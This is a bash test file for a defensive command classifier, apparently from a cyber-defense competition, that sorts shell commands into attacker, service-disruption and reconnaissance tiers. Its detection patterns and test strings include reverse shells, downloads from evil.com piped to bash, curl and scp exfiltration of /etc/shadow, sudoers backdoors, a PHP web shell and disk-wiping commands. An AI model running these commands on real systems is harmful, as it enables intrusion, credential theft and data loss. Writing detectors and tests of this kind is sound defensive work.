#!/usr/bin/env bash
# test_classify.sh -- unit tests for classify_command pattern matching.
# Run on Linux or WSL: bash test_classify.sh
#
# Pattern arrays must stay in sync with ope.sh.

REDTEAM_PATTERNS=(
    'bash -i|/dev/tcp/|/dev/udp/'
    '\bsh\b -i'
    '\bnc\b -[a-zA-Z]*[ec]|\bncat\b -[a-zA-Z]*[ec]'
    '\bnc\b .* [0-9]{2,5}$|\bncat\b .* [0-9]{2,5}$'
    '\bsocat\b'
    'busybox nc'
    '\bmkfifo\b'
    'openssl s_client.*-connect|openssl.*-connect.* exec'
    'awk.*/inet/tcp'
    '\blua\b -e.*(socket|connect)'
    'xterm.*-display [0-9]'
    '(curl|wget|aria2c|axel) .+\| *(ba)?sh'
    '(curl|wget|aria2c|axel) .+\| *(python[23]?|perl|ruby|php)'
    '(curl|wget|aria2c|axel) .*\.(sh|py|pl|rb|elf|bin)'
    '(curl|wget|aria2c|axel) .* -[Oo] /(tmp|dev/shm|var/tmp)/'
    'curl .*(--data|-d[^a-z]|--form|-F[^a-z])'
    'wget.*(--post-data|--post-file)'
    '(scp|rsync) .+ [a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+:'
    'tar .+\| *(nc|ncat|curl|wget|ssh)'
    'ssh .*-[a-zA-Z]*(R|L|D)'
    '/etc/shadow|/etc/gshadow'
    '(cat|less|head|xxd|base64|strings|openssl) .+\.ssh/id_'
    'authorized_keys'
    '(>>|>) /etc/passwd|(>>|>) /etc/shadow'
    '\btee\b .*/etc/(passwd|shadow)'
    '(>>|>) /etc/hosts|\btee\b .*/etc/hosts'
    '\buseradd\b|\badduser\b|\buserdel\b|\bdeluser\b'
    '\busermod\b|\bchpasswd\b'
    'passwd [^ ]'
    '\bvisudo\b|\bsudoedit\b'
    'echo .*(ALL|NOPASSWD).*(>>|>) .*/sudoers'
    '\bsudo\b -[a-zA-Z]*[si]\b'
    '/etc/sudoers\.d/'
    'chmod .*(u\+s|\+s|4[0-7][0-7][0-7])'
    'setenforce 0|setenforce Permissive'
    'iptables -F|iptables --flush|ufw disable|firewall-cmd.*--panic'
    'nft flush|\baa-disable\b|apparmor_parser -R'
    'LD_PRELOAD='
    '/etc/ld\.so\.preload'
    'BASH_ENV='
    '/etc/pam\.d/'
    '/etc/systemd/system/.*\.service'
    '> /var/log/|shred .*/var/log/'
    'history -c|unset HISTFILE|HISTSIZE=0'
    '\bcrontab\b -e'
    '\btee\b -a.*(\.bashrc|\.profile|\.zshrc|\.bash_profile|authorized_keys)'
    'echo .+(>>|>) .*(\.bashrc|\.bash_profile|\.profile|\.zshrc|\.bash_logout)'
    '/etc/cron\.(d|daily|hourly|weekly|monthly)|/etc/rc\.local|/etc/profile\.d'
    'echo .+\| *\bat\b'
    '\btee\b .*/var/www/.*\.(php|sh|py|pl|jsp|aspx)'
    '(>>|>) .*/var/www/.*\.(php|sh|py|pl|jsp|aspx)'
    'python[23]? -c .*(socket|pty|subprocess|os\.system)'
    'perl -e .*(socket|fork|exec)'
    'ruby -e .*TCPSocket'
    'php -r .*(fsockopen|shell_exec|system|exec|passthru|popen)'
    'find .* -perm.*(4000|u\+s)'
    '\bstrace\b|\bltrace\b|\bgdb\b'
    '\bchattr\b'
    'docker run.*--privileged|\bnsenter\b|\blxc\b|\blxd\b'
    '(>>|>) /etc/ssh/|\btee\b .*/etc/ssh/'
    '\bsed\b.*-i.*/etc/ssh/'
    '(>>|>) /etc/bind/|\btee\b .*/etc/bind/'
    '(>>|>) /var/lib/bind/|\btee\b .*/var/lib/bind/'
    '(>>|>) /etc/named/|\btee\b .*/etc/named/'
    '(>>|>) /var/named/|\btee\b .*/var/named/'
    '\bnsupdate\b'
    '\bip6tables\b.*(-F\b|--flush)'
    'mysql.*(--execute|-e).*(DROP USER|ALTER USER|SET PASSWORD|RENAME USER)'
    'mysql.*(--execute|-e).*(GRANT|REVOKE).*(ALL|SUPER|PROXY)'
    '\bmysqladmin\b.*(password|set-password|flush-privileges)'
    'mariadb.*(--execute|-e).*(DROP USER|ALTER USER|SET PASSWORD|RENAME USER)'
    'mariadb.*(--execute|-e).*(GRANT|REVOKE).*(ALL|SUPER|PROXY)'
    '\bmariadb-admin\b.*(password|set-password|flush-privileges)'
    'psql.*(--command|-c).*(DROP USER|ALTER USER|SET PASSWORD|CREATE USER|REVOKE)'
    '/etc/\.redteam'
    '\bbidir-comms\b|\bpass-watch\b'
    '\bansible\b .* -m *(shell|command|raw|script)\b'
    '\bscript\b -q /dev/null|\bscript\b.*/dev/null'
    '\bstty\b raw'
    'ruby -rsocket'
    'node -e.*(require.*net|net\.connect|net\.Socket)'
    '\btclsh\b|\bwish\b'
    '\bsystemd-run\b'
    '\bsetcap\b'
    '(>>|>) /etc/profile\b|\btee\b .*/etc/profile\b'
    '(>>|>) /root/\.bashrc|\btee\b .*/root/\.bashrc'
    '\bat\b -f'
    'base64 -w 0|base64 --wrap=0'
    'ln -s.*(shadow|sudoers)'
)

SCORING_PATTERNS=(
    '\bsystemctl\b.*(stop|disable|mask)'
    '\bservice\b .+ (stop|disable)'
    '\bpkill\b|\bkillall\b'
    '\bkill\b -[1-9]'
    '\bshutdown\b|\breboot\b|\bhalt\b|\bpoweroff\b'
    'rm -(rf|fr|Rf|fR|rF|Fr)'
    'dd if='
    'mkfs\.'
    '\bfdisk\b|\bparted\b|\bgdisk\b'
    '(>>|>) .*/var/www/html/index\.'
    'rm .*/var/www'
    '\b(curl|wget|aria2c|axel)\b.*-[Oo] .*/var/www/'
    '\bcrontab\b -r'
)

OTHER_PATTERNS=(
    '\bid\b|\bwhoami\b|\bgroups\b'
    '\buname\b|\bhostname\b'
    '\bps\b|\btop\b|\bhtop\b|\bpgrep\b'
    '\bnetstat\b|\bss\b -'
    'ifconfig|\bip\b (addr|route|link|neigh)'
    '\barp\b -[an]'
    '\btcpdump\b|\btshark\b'
    '(cat|less|more|head|tail) /etc/passwd'
    '(cat|less|more|head|tail) /etc/(hosts|resolv\.conf|group|crontab)'
    'ls .*/root'
    '(cat|less|head) /etc/sudoers'
    'ls /etc/cron'
    'find / -name '
    '\blocate\b '
    'dpkg -l|rpm -qa'
    '\blast\b|\blastlog\b|\bwho\b'
    '\bdf\b|\blsblk\b|\bblkid\b'
    '\blsof\b'
    '\bgetcap\b'
    '\bssh-keygen\b'
    'base64 -d|base64 --decode'
    '\bsmbclient\b'
    'find .* -writable'
    'systemctl (start|restart|reload|enable|status)'
    'service .+ (start|restart|status)'
    'sudo -[lL]'
    '\bmount\b|\bumount\b'
    '\bansible-playbook\b|\bansible\b'
)

printf -v REDTEAM_RE '%s|' "${REDTEAM_PATTERNS[@]}"; REDTEAM_RE="${REDTEAM_RE%|}"
printf -v SCORING_RE '%s|' "${SCORING_PATTERNS[@]}"; SCORING_RE="${SCORING_RE%|}"
printf -v OTHER_RE   '%s|' "${OTHER_PATTERNS[@]}";   OTHER_RE="${OTHER_RE%|}"

classify() {
    local cmd="$1" sev="none"
    if   grep -qE "${REDTEAM_RE}" <<< "${cmd}"; then sev="REDTEAM"
    elif grep -qE "${SCORING_RE}" <<< "${cmd}"; then sev="SCORING"
    elif grep -qE "${OTHER_RE}"   <<< "${cmd}"; then sev="OTHER"
    fi
    echo "${sev}"
}

pass=0; fail=0
check() {
    local label="$1" cmd="$2" want="$3"
    local got; got="$(classify "${cmd}")"
    if [[ "${got}" == "${want}" ]]; then
        printf "  PASS [%-7s] %s\n" "${want}" "${label}"
        (( pass++ )) || true
    else
        printf "  FAIL expected=%-7s got=%-7s :: %s\n" "${want}" "${got}" "${label}"
        (( fail++ )) || true
    fi
}

# ===========================================================================
echo "=== REDTEAM: must catch ==="
# shells
check "bash /dev/tcp revshell"    'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'              REDTEAM
check "nc -e exec shell"          'nc -e /bin/bash 10.0.0.1 4444'                       REDTEAM
check "nc port-only revshell"     'nc 10.0.0.1 4444'                                    REDTEAM
check "nc listen"                 'nc -lnvp 4444'                                        REDTEAM
check "ncat listen"               'ncat -lvp 9001'                                       REDTEAM
check "socat pty"                 'socat TCP:10.0.0.1:4444 EXEC:/bin/bash,pty'          REDTEAM
check "busybox nc"                'busybox nc 10.0.0.1 4444'                             REDTEAM
check "mkfifo pipe"               'mkfifo /tmp/f'                                        REDTEAM
check "openssl revshell"          'openssl s_client -connect 10.0.0.1:4444'             REDTEAM
check "python socket shell"       'python3 -c "import socket,pty;s=socket.socket()"'    REDTEAM
check "perl socket shell"         'perl -e "use Socket;socket(S,PF_INET,SOCK_STREAM)"'  REDTEAM
# download and execute
check "curl pipe bash"            'curl http://evil.com/shell.sh | bash'                REDTEAM
check "wget pipe sh"              'wget -O- http://evil.com/shell.sh | sh'              REDTEAM
check "wget elf download"         'wget http://evil.com/backdoor.elf -O /tmp/bd'        REDTEAM
check "curl to /tmp"              'curl http://evil.com/payload -o /tmp/payload'        REDTEAM
check "aria2c shell download"     'aria2c http://evil.com/shell.sh'                     REDTEAM
check "axel download to tmp"      'axel http://evil.com/payload -o /tmp/payload'        REDTEAM
check "wget post-data exfil"      'wget --post-data @/etc/passwd http://evil.com/'      REDTEAM
# exfil (curl -d space and no-space variants)
check "curl exfil --data"         'curl --data @/etc/passwd http://evil.com/'           REDTEAM
check "curl exfil -d space"       'curl -d @/etc/shadow http://evil.com/'               REDTEAM
check "curl exfil -d@ no space"   'curl -d@/etc/shadow http://evil.com/'                REDTEAM
check "curl exfil -F form"        'curl -F file=@/etc/passwd http://evil.com/'          REDTEAM
check "scp exfil"                 'scp /etc/shadow root@evil.com:/tmp/'                 REDTEAM
check "tar over nc"               'tar czf - /etc | nc 10.0.0.1 4444'                   REDTEAM
# SSH tunneling -- combined flags and separate flags (bug fix: ssh -v -R)
check "ssh -R combined flags"     'ssh -NfR 8080:localhost:80 evil@c2.com'              REDTEAM
check "ssh -D socks"              'ssh -D 1080 user@c2.com'                             REDTEAM
check "ssh -v -R separate flags"  'ssh -v -R 8080:localhost:80 evil@c2.com'             REDTEAM
check "ssh -L local fwd"          'ssh -L 3306:localhost:3306 pivot@10.0.0.1'          REDTEAM
# credential access
check "cat shadow"                'cat /etc/shadow'                                     REDTEAM
check "cat private key"           'cat /root/.ssh/id_rsa'                               REDTEAM
check "base64 private key"        'base64 /home/alice/.ssh/id_ed25519'                  REDTEAM
check "authorized_keys append"    'echo "pubkey" >> /home/alice/.ssh/authorized_keys'   REDTEAM
# user/priv manipulation
check "useradd"                   'useradd -m -s /bin/bash backdoor'                    REDTEAM
check "passwd other user"         'passwd root'                                         REDTEAM
check "chmod u+s"                 'chmod u+s /bin/bash'                                 REDTEAM
check "chmod 4755 suid"           'chmod 4755 /usr/local/bin/shell'                     REDTEAM
check "sudo -s root shell"        'sudo -s'                                             REDTEAM
check "sudo -i login shell"       'sudo -i'                                             REDTEAM
check "sudoers.d persistence"     'echo "evil ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/evil' REDTEAM
# security bypass
check "ufw disable"               'ufw disable'                                         REDTEAM
check "iptables flush"            'iptables -F'                                         REDTEAM
check "LD_PRELOAD hijack"         'LD_PRELOAD=/tmp/evil.so /usr/bin/sudo'               REDTEAM
check "BASH_ENV injection"        'BASH_ENV=/tmp/evil.sh ls'                            REDTEAM
# hosts file
check "hosts file append"         'echo "10.0.0.1 scoring.ncae.edu" >> /etc/hosts'     REDTEAM
check "tee to /etc/hosts"         'echo "bad" | tee /etc/hosts'                        REDTEAM
# history/log tampering
check "history clear"             'history -c'                                          REDTEAM
check "HISTFILE unset"            'unset HISTFILE'                                      REDTEAM
# persistence
check "crontab edit"              'crontab -e'                                          REDTEAM
check "bashrc append"             'echo "bash -i &>/dev/tcp/evil/4444" >> ~/.bashrc'    REDTEAM
check "web shell php"             'echo "<?php system(\$_GET[c]);?>" >> /var/www/html/shell.php' REDTEAM
check "pam backdoor"              'cp evil.so /etc/pam.d/common-auth'                  REDTEAM
check "systemd persist"           'cp revshell.service /etc/systemd/system/revshell.service' REDTEAM
# process tracing
check "find suid"                 'find / -perm -4000 -type f'                          REDTEAM
check "strace credentials"        'strace -p 1234 -e trace=read,write'                 REDTEAM
check "gdb process inject"        'gdb -p 1234'                                         REDTEAM
check "chattr immutable"          'chattr +i /etc/cron.d/backdoor'                      REDTEAM
# scored service config modification
check "sshd_config append"        'echo "PermitRootLogin yes" >> /etc/ssh/sshd_config'  REDTEAM
check "sshd_config tee"           'echo "PasswordAuthentication yes" | tee /etc/ssh/sshd_config' REDTEAM
check "sshd_config sed"           'sed -i "s/PermitRootLogin no/PermitRootLogin yes/" /etc/ssh/sshd_config' REDTEAM
check "bind zone append"          'echo "evil A 10.0.0.1" >> /etc/bind/db.local'        REDTEAM
check "named zone tee"            'echo "bad" | tee /var/named/example.zone'            REDTEAM
check "nsupdate dns"              'nsupdate -k /etc/bind/Kdefault.key'                  REDTEAM
check "ip6tables flush"           'ip6tables -F'                                        REDTEAM
check "ip6tables flush long"      'ip6tables --flush'                                   REDTEAM
check "mysql drop user"           'mysql -e "DROP USER '"'"'scoring'"'"'@'"'"'%'"'"'"' REDTEAM
check "mysql alter user password" 'mysql --execute "ALTER USER '"'"'root'"'"'@'"'"'localhost'"'"' IDENTIFIED BY '"'"'evil'"'"'"' REDTEAM
check "mysql grant all"           'mysql -e "GRANT ALL ON *.* TO '"'"'evil'"'"'@'"'"'%'"'"'"' REDTEAM
check "mysqladmin password"       'mysqladmin -u root password newpass'                  REDTEAM
check "psql drop user"            'psql -c "DROP USER scoring"'                         REDTEAM
check "psql alter user"           'psql --command "ALTER USER postgres WITH PASSWORD '"'"'evil'"'"'"' REDTEAM
# mariadb CLI (Ubuntu 22.04+ primary binary name -- same syntax as mysql)
check "mariadb drop user"         'mariadb -e "DROP USER '"'"'scoring'"'"'@'"'"'%'"'"'"'  REDTEAM
check "mariadb alter user"        'mariadb --execute "ALTER USER '"'"'root'"'"'@'"'"'localhost'"'"' IDENTIFIED BY '"'"'evil'"'"'"' REDTEAM
check "mariadb grant all"         'mariadb -e "GRANT ALL ON *.* TO '"'"'evil'"'"'@'"'"'%'"'"'"' REDTEAM
check "mariadb-admin password"    'mariadb-admin -u root password newpass'                REDTEAM
# Saprus C2
check "Saprus redteam dir"        'ls /etc/.redteam/'                                    REDTEAM
check "Saprus passwd.log cat"     'cat /etc/.redteam/passwd.log'                        REDTEAM
check "Saprus bidir-comms"        'bidir-comms --server 10.0.0.1 --port 4222'          REDTEAM
check "Saprus pass-watch"         'pass-watch --dir /etc/.redteam'                     REDTEAM
# ansible attack modules
check "ansible shell module"      'ansible all -m shell -a "id"'                       REDTEAM
check "ansible command module"    'ansible webservers -m command -a "whoami"'          REDTEAM
check "ansible raw module"        'ansible all -m raw -a "bash -i"'                    REDTEAM
check "ansible script module"     'ansible targets -m script -a /tmp/evil.sh'         REDTEAM
# shell upgrade
check "script -q /dev/null"       'script -q /dev/null'                                REDTEAM
check "script /dev/null bare"     'script /dev/null'                                   REDTEAM
check "stty raw -echo"            'stty raw -echo'                                     REDTEAM
# additional interpreter shells
check "ruby rsocket shell"        'ruby -rsocket -e "TCPSocket.open(\"10.0.0.1\",4444)"' REDTEAM
check "node net connect shell"    'node -e "require(\"net\").connect(4444,\"10.0.0.1\")"' REDTEAM
check "tclsh shell"               'tclsh'                                               REDTEAM
check "wish shell"                'wish'                                                REDTEAM
# systemd transient execution
check "systemd-run evasion"       'systemd-run --unit=evil bash'                       REDTEAM
check "systemd-run scope"         'systemd-run --scope --unit=c2 /tmp/payload'        REDTEAM
# capability abuse
check "setcap setuid"             'setcap cap_setuid+ep /bin/bash'                    REDTEAM
check "setcap net_bind"           'setcap cap_net_bind_service+ep /tmp/payload'       REDTEAM
# profile / rc persistence
check "/etc/profile append"       'echo "bash -i &>/dev/tcp/c2/4444" >> /etc/profile' REDTEAM
check "/etc/profile tee"          'echo "evil" | tee /etc/profile'                    REDTEAM
check "/root/.bashrc append"      'echo "curl http://c2/sh | bash" >> /root/.bashrc'  REDTEAM
check "/root/.bashrc tee"         'echo "evil" | tee /root/.bashrc'                   REDTEAM
# at job from file
check "at -f job file"            'at -f /tmp/evil.sh now'                             REDTEAM
check "at -f job later"           'at -f /tmp/payload now+1min'                       REDTEAM
# payload encoding
check "base64 -w 0 encode"        'cat /etc/shadow | base64 -w 0'                     REDTEAM
check "base64 --wrap=0"           'base64 --wrap=0 /etc/shadow'                       REDTEAM
# symlink attacks
check "ln -s shadow"              'ln -s /etc/shadow /tmp/shadow'                     REDTEAM
check "ln -s sudoers"             'ln -s /etc/sudoers /tmp/sudoers'                   REDTEAM

# ===========================================================================
echo ""
echo "=== SCORING: must catch ==="
check "systemctl stop"            'systemctl stop apache2'                              SCORING
check "systemctl --now stop"      'systemctl --now stop nginx'                          SCORING
check "systemctl disable"         'systemctl disable sshd'                              SCORING
check "systemctl mask"            'systemctl mask mysql'                                SCORING
check "service stop"              'service vsftpd stop'                                 SCORING
check "pkill service"             'pkill apache2'                                       SCORING
check "killall service"           'killall nginx'                                       SCORING
check "kill -9"                   'kill -9 1234'                                        SCORING
check "kill -15"                  'kill -15 5678'                                       SCORING
check "kill -1 sighup"            'kill -1 1234'                                        SCORING
check "rm -rf data"               'rm -rf /var/lib/mysql'                              SCORING
check "reboot"                    'reboot'                                              SCORING
check "shutdown"                  'shutdown -h now'                                     SCORING
check "poweroff"                  'poweroff'                                            SCORING
check "dd wipe"                   'dd if=/dev/zero of=/dev/sda'                        SCORING
check "mkfs wipe"                 'mkfs.ext4 /dev/sda1'                                SCORING
check "fdisk"                     'fdisk /dev/sda'                                      SCORING
check "crontab -r"                'crontab -r'                                         SCORING
check "wget overwrite web flag-first"  'wget -O /var/www/html/index.html http://evil.com/deface' SCORING
check "wget overwrite web url-first"   'wget http://evil.com/deface.html -O /var/www/html/index.html' SCORING
check "curl overwrite web"             'curl http://evil.com/evil.php -o /var/www/html/shell.php' SCORING

# ===========================================================================
echo ""
echo "=== OTHER: expected tier ==="
check "id command"                'id'                                                  OTHER
check "whoami"                    'whoami'                                              OTHER
check "ps aux"                    'ps aux'                                              OTHER
check "netstat -tulpn"            'netstat -tulpn'                                      OTHER
check "ss -tulpn"                 'ss -tulpn'                                           OTHER
check "ip addr"                   'ip addr show eth0'                                   OTHER
check "cat /etc/passwd"           'cat /etc/passwd'                                     OTHER
check "cat /etc/hosts"            'cat /etc/hosts'                                      OTHER
check "last logins"               'last -n 20'                                          OTHER
check "who is logged in"          'who'                                                 OTHER
check "systemctl status"          'systemctl status sshd'                               OTHER
check "systemctl restart"         'systemctl restart nginx'                             OTHER
check "service restart"           'service apache2 restart'                             OTHER
check "ssh-keygen generate"       'ssh-keygen -t ed25519 -C user@host'                 OTHER
check "smbclient test"            'smbclient -L //localhost -N'                         OTHER
check "base64 decode admin"       'base64 -d /tmp/encoded.txt'                         OTHER
check "find writable"             'find /var/www -writable'                             OTHER
check "df disk space"             'df -h'                                               OTHER
check "lsblk"                     'lsblk'                                               OTHER
check "lsof ports"                'lsof -i :80'                                         OTHER
check "sudo -l list"              'sudo -l'                                             OTHER
check "mount"                     'mount'                                               OTHER
check "tcpdump debug"             'tcpdump -i eth0 port 80'                            OTHER
check "ansible-playbook"          'ansible-playbook site.yml -i inventory'            OTHER
check "ansible ping"              'ansible all -m ping'                                OTHER
check "sshd reload"               'systemctl reload sshd'                               OTHER

# ===========================================================================
echo ""
echo "=== FALSE POSITIVES: must NOT match ==="
# ssh -i is normal key-file auth; tunneling requires -R/-L/-D
check "ssh -i identity file"      'ssh -i /home/alice/.ssh/id_ed25519 user@server'     none
# passwd alone = own password; only 'passwd <user>' is REDTEAM
check "passwd own password"       'passwd'                                              none
# curl -w is a timing/format flag, not data exfil
check "curl -w format flag"       'curl -w "%{http_code}" http://localhost/'            none
# env with full interpreter path should not match 'bash -i'
check "env python interpreter"    '/usr/bin/env python3 /usr/bin/pip3 install pkg'     none
check "env bash script"           '/usr/bin/env bash /usr/local/bin/setup.sh'          none
# .tar.gz is not in the executable extension list
check "wget .tar.gz download"     'wget https://example.com/pkg-1.0.tar.gz'            none
# python3 -m uses -m not -c; our shell pattern requires -c
check "python http.server"        'python3 -m http.server 8080'                        none
check "apt-get install"           'apt-get install -y curl'                             none
# chmod without SUID bit
check "chmod 644 html"            'chmod 644 /var/www/html/index.html'                 none
check "chmod 755 bin"             'chmod 755 /usr/local/bin/myscript'                  none
# rsync/tar to local path (no user@host: remote syntax)
check "rsync local backup"        'rsync -av /var/www/ /backup/www/'                   none
check "tar local backup"          'tar czf /backup/www.tar.gz /var/www'                none
check "openssl cert view"         'openssl x509 -in /etc/ssl/cert.pem -text'           none
check "ssh normal connect"        'ssh alice@10.0.0.5'                                  none
# kill -l lists signals; kill -0 tests process existence without sending a signal
check "kill -l list signals"      'kill -l'                                             none
check "kill -0 process check"     'kill -0 1234'                                        none
# sudo -v validates timestamp only
check "sudo -v validate"          'sudo -v'                                             none
# mysql SELECT/SHOW are not destructive
check "mysql select query"        'mysql -e "SELECT * FROM users LIMIT 10"'            none
check "mysql show databases"      'mysql --execute "SHOW DATABASES"'                   none
check "mariadb select query"      'mariadb -e "SELECT * FROM users LIMIT 10"'          none
check "mariadb show databases"    'mariadb --execute "SHOW DATABASES"'                 none
# reading sshd_config (not writing)
check "cat sshd_config"           'cat /etc/ssh/sshd_config'                           none
# script with a real log file is session recording, NOT shell upgrade
check "script session log"        'script /tmp/session.log'                            none
# stty without 'raw' -- normal terminal settings
check "stty size"                 'stty size'                                           none
check "stty rows cols"            'stty rows 40 cols 200'                              none
# base64 with default line wrapping -- not a one-line payload blob
check "base64 encode normal"      'base64 /etc/hostname'                               OTHER
check "base64 decode file"        'base64 -d /tmp/encoded.txt'                        OTHER
# ln -s to a non-sensitive target
check "ln -s non-sensitive"       'ln -s /usr/bin/python3 /usr/local/bin/python'      none
# getcap enumeration (read, not set)
check "getcap enumerate"          'getcap -r / 2>/dev/null'                           OTHER
# ansible safe modules don't execute shell, but all ansible usage is logged (OTHER)
check "ansible copy module"       'ansible all -m copy -a "src=/tmp/a dest=/tmp/b"'  OTHER
check "ansible file module"       'ansible all -m file -a "path=/tmp/x state=absent"' OTHER
# curl -O downloading a known-safe archive extension
check "curl download tarball"     'curl -O https://example.com/app-1.0.tar.gz'        none

# ===========================================================================
echo ""
echo "=== KNOWN AMBIGUOUS: fire on both attacker and defender activity ==="
# These correctly classify but blue team may trigger them legitimately.
# Human review is required when these appear in the log.
# chattr +i is used offensively to protect backdoors AND defensively to lock config files
check "chattr defensive use"      'chattr +i /etc/passwd'                              REDTEAM
# visudo is the correct way to edit sudoers -- both attacker and defender use it
check "visudo legitimate"         'visudo'                                              REDTEAM
# reading authorized_keys is common for blue team auditing
check "cat authorized_keys audit" 'cat /home/alice/.ssh/authorized_keys'              REDTEAM
# fixing key file permissions is normal blue team hardening
check "chmod 600 authorized_keys" 'chmod 600 /home/alice/.ssh/authorized_keys'        REDTEAM
# socat is used by blue team to test ports (e.g. socat - TCP:localhost:22)
check "socat service probe"       'socat - TCP:localhost:22'                           REDTEAM
# pkill -HUP and killall -HUP send reload (SIGHUP), not SIGKILL -- graceful restart
check "pkill -HUP reload"         'pkill -HUP sshd'                                   SCORING
check "killall -HUP reload"       'killall -HUP nginx'                                 SCORING
# kill -1 (SIGHUP) tells a service to reload its config
check "kill -1 sighup reload"     'kill -1 $(pgrep sshd)'                             SCORING

echo ""
printf "Result: %d passed, %d failed\n" "${pass}" "${fail}"
[[ "${fail}" -eq 0 ]] && exit 0 || exit 1
